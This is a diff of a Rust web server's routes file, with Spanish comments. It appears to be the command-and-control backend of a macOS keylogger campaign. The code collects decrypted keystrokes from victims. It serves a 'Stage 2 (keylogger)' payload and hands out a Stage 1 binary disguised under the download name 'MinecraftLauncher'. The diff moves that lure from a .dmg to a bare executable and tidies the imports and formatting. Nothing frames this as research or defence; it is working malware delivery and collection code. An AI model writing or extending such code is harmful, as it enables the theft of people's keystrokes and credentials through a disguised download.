@@ -1,15 +1,15 @@
 // routes.rs
+use crate::crypto;
+use crate::storage::Storage;
 use axum::{
     extract::State,
-    http::{StatusCode, header},
-    response::{Json, Response, IntoResponse},
+    http::{header, StatusCode},
+    response::{IntoResponse, Json, Response},
     routing::{get, post},
     Router,
 };
-use std::sync::Arc;
-use crate::storage::Storage;
-use crate::crypto;
 use std::path::PathBuf;
+use std::sync::Arc;
 
 pub fn create_routes(storage: Storage) -> Router {
     Router::new()
@@ -87,49 +87,49 @@ pub async fn receive_keys_batch(
 }
 
 // Obtener todas las teclas (YA DESCIFRADAS)
-pub async fn get_keys(
-    State(storage): State<Arc<Storage>>,
-) -> Json<Vec<serde_json::Value>> {
+pub async fn get_keys(State(storage): State<Arc<Storage>>) -> Json<Vec<serde_json::Value>> {
     Json(storage.get_all())
 }
 
-// Servir payload (Stage 2)
+// ============================================================
+// SERVIR PAYLOADS
+// ============================================================
+
+/// Sirve el Stage 2 (keylogger)
 pub async fn serve_payload() -> Vec<u8> {
-    std::fs::read("./payloads/stage2_macos").unwrap_or_default()
+    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("payloads/stage2_macos");
+    println!("📤 Sirviendo Stage 2 desde: {:?}", path);
+    std::fs::read(path).unwrap_or_default()
 }
 
-// ============================================================
-// Servir la App de Minecraft (Stage 1) - CORREGIDO PARA .dmg
-// ============================================================
+/// Sirve el Stage 1 como binario suelto (Unix Executable File)
+/// ESTE ES EL ENDPOINT QUE ESTABA ANTES EN /download/stage1
+pub async fn serve_stage1_bin() -> Response {
+    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("payloads/stage1_macos");
 
-pub async fn serve_stage1_app() -> Response {
-    // Ruta absoluta usando CARGO_MANIFEST_DIR
-    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
-        .join("payloads/MinecraftLauncher.dmg");
-
-    println!("📤 Intentando servir: {:?}", path);
-    println!("📤 ¿Existe? {}", path.exists());
-
-    match std::fs::metadata(&path) {
-        Ok(meta) => println!("📤 Tamaño: {} bytes", meta.len()),
-        Err(_) => println!("📤 Tamaño: N/A (no existe)"),
-    }
+    println!("📤 Sirviendo binario Stage 1 desde: {:?}", path);
 
     match std::fs::read(&path) {
         Ok(data) => {
-            println!("✅ Archivo leído ({} bytes)", data.len());
+            println!("✅ Binario leído ({} bytes)", data.len());
             Response::builder()
                 .status(StatusCode::OK)
-                .header("Content-Type", "application/x-apple-diskimage")
-                .header("Content-Disposition", "attachment; filename=\"MinecraftLauncher.dmg\"")
+                .header("Content-Type", "application/octet-stream")
+                .header(
+                    "Content-Disposition",
+                    "attachment; filename=\"MinecraftLauncher\"",
+                )
                 .body(axum::body::Body::from(data))
                 .unwrap()
         }
         Err(e) => {
-            eprintln!("❌ Error leyendo archivo: {}", e);
+            eprintln!("❌ Error leyendo binario: {}", e);
             Response::builder()
                 .status(StatusCode::NOT_FOUND)
-                .body(axum::body::Body::from(format!("Archivo no encontrado: {}", e)))
+                .body(axum::body::Body::from(format!(
+                    "Archivo no encontrado: {}",
+                    e
+                )))
                 .unwrap()
         }
     }
